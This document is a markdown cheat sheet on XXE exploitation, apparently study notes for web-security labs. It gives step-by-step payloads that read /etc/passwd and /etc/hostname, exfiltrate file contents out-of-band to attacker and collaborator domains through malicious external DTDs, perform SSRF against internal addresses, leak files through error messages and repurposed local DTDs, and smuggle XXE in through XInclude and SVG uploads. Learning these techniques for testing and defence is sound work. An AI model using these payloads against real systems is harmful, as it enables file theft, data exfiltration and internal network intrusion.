# XXE exploitation

## Summary
* [XML custom entities](#xml-custom-entities)
* [XML external entities](#xml-external-entities)
* [Types of XXE attacks](#types-of-xxe-attacks)
    * [Exploiting XXE to retrieve files](#exploiting-xxe-to-retrieve-files)
    * [Exploiting XXE to perform SSRF attacks](#exploiting-xxe-to-perform-ssrf-attacks)
    * [Exploiting blind XXE exfiltrate data out-of-band](#exploiting-blind-xxe-exfiltrate-data-out-of-band)
    * [Exploiting blind XXE with external DTD](#exploiting-blind-xxe-to-exfiltrate-data-out-of-band-using-a-malicious-external-dtd)
    * [Exploiting blind XXE via error messages](#exploiting-blind-xxe-to-retrieve-data-via-erro-messages-using-a-malicious-external-dtd)
    * [Exploiting blind XXE by repurposing a local DTD](#exploiting-blind-xxe-by-repurposing-a-local-dtd)
* [Finding hidden attack surface](#finding-hidden-attack-surface-for-xxe-injection)
    * [Exploiting XXE with XInclude to retrieve files](#exploiting-xxe-with-XInclude-to-retrieve-files)
    * [Exploiting XXE via image file upload](#exploiting-xxe-via-image-file-upload)
    * [XXE attacks via modified content type](#xxe-attacks-via-modified-content-type)

## XML CUSTOM ENTITIES
XML allows custom entities to be defined within the DTD
```
<!DOCTYPE foo [ <!ENTITY myentity "my entity value" >]>
<!DOCTYPE foo [ <!ENTITY % myentity "my entity value" >]>
```

## XML EXTERNAL ENTITIES
XML allows custom entities
```
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://example.com" >]>
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" >]>
```
# regular entities are references as &ext;
XML parameter entities
```
<!DOCTYPE foo [ <!ENTITY % myentity "my entity value" >]>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
#parameter entities are referenced as %myentity;
```

## XML CODE EXECUTION
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
   <!ELEMENT data ANY >
   <!ENTITY name SYSTEM "file:///etc/passwd" >]>
<comment>
  <name>&name;</name>
  <author>Barry Clad</author>
  <com>comments</com>
</comment>
```

## TYPES OF XXE ATTACKS
### Exploiting XXE to retrieve files
Suppose an application has a "check stock feature that parses XML input and returns the values in the response".

Visit a product page, click "check stock" and send the request to Burp Repeater.

Insert the external entity definition in between the XML declaration and the original element.
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
```
Replace the productId parameter value in the original element with a reference to the external entity "&xxe;" and send the request. 

The response should contain "invalid product ID" followed by the response of the contents from the /etc/passwd file.

### Exploiting XXE to perform SSRF attacks
Visit a product page, click "check stock" and send the request to Burp Repeater. 

Insert the external entity definition in between the XML declaration and the original element
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://192.168.0.2" >]>
```
Replace the productId parameter value in the original element with a reference to the external entity "&xxe;" and send the request

The response should contain "invalid product ID" followed by the response from the URL endpoint, which will initially be a folder name

Iteratively update the URL with the folder name to explore the URL

### Exploiting blind XXE exfiltrate data out-of-band
Open Burp-Collaborator Client and copy the payload to the clipboard

Visit a product page, click "check stock" and send the request to Burp Repeater

Insert the external entity definition in between the XML declarations and the original element then paste the copied payload from Burp-Collaborator in the URL
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "burp-collaborator.domain" >]>
```
Replace the productId parameter value in the original element with a reference to the external entity "&xxe;" and send the request

In Burp-Collaborator, click "poll now" and observe there are multiple DNS and HTTP interations from the application

### Exploiting blind XXE to exfiltrate data out-of-band using a malicious external DTD
Open Burp-Collaborator Client and copy the payload to the clipboard and place the Burp Collaborator payload into a malicious DTD file
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://BURP-COLLABORATOR-DOMAIN/?x=%file;'>">
%eval;
%exfil;
```
Go to exploit server and save the malicious DTD file on the server and take note of the URL

Visit a product page, click "check stock" and send the request to Burp Repeater

Insert the external entity definition in between the XML declarations and the original element 
```
<!DOCTYPE foo [!ENTITY % xxe SYSTEM "https://exploit-server.com/exploit.dtd"> %xxe;]>
```
Replace the productId parameter value in the original element with a reference to the external entity "%xxe;" and send the request

In Burp-Collaborator, click "poll now" and observe there are multiple DNS and HTTP interactions from the application

### Exploiting blind XXE to retrieve data via error messages using a malicious external DTD
Place the Burp Collaborator payload into a malicious DTD file
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
Go to exploit server and save the malicious DTD file on the server and take note of the URL

Visit a product page, click "check stock" and send the request to Burp Repeater

Insert the external entity definition in between the XML declarations and the origina element
```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "exploit-server.com"> %xxe;]>
```
Replace the productId parameter value in the original element with a reference to the external entity "%xxe;" and send the request

An error should be in the response including the contents of /etc/passwd file

### Exploiting blind XXE by repurposing a local DTD
Visit a product page, click "check stock" and send the request to Burp Repeater

Insert the external entity definition in between the XML declarations and the original element to locate an existing DTD file
```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
Replace the productId parameter value in the original element with a reference to the external entity "%local_dtd;" and send the request

Observe the response did not include an error meaning there is a DTD file called docbookx.dtd

Erase the previous external entity and replace with below XML external entity definition to submit the payload
```
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
This will import the Yelp DTD, then redefine the ISOamso entity, triggering an error message containing the contents of the /etc/passwd file.

Replace the productId parameter value in the original element with a reference to the external entity "%local_dtd;, %eval;, %error;" and send the request

An error should be in the response including the contents of /etc/passwd file


##  FINDING HIDDEN ATTACK SURFACE FOR XXE INJECTION
### Exploiting XXE with XInclude to retrieve files
Visit a product page, click "check stock" and send the request to Burp Repeater

Observe that the response does not include XML documents that means we cant define a DTD to launch a classic XXE attack

Instead we are going to use XInclude that allows an XML document to be built from sub-documents

Replace the productId parameter value with a reference to XInclude namespace and the file path to be retrieved and send the request
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```
An error should be in the response including the contents of /etc/passwd file

### Exploiting XXE via image file upload
Suppose an application has a upload image function

Create a local SVG image with the following content
```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```
Upload the SVG image and you should see the contents of the /etc/hostname file in the image

This happens because SVG format uses XML

### XXE attacks via modified content type
```
> content-type: text/xml
> <?xml version="1.0" encoding="UTF-8"?><foo>bar</foo> will result as "foo=bar" if the content type is application/x-www-form-urlencoded
```
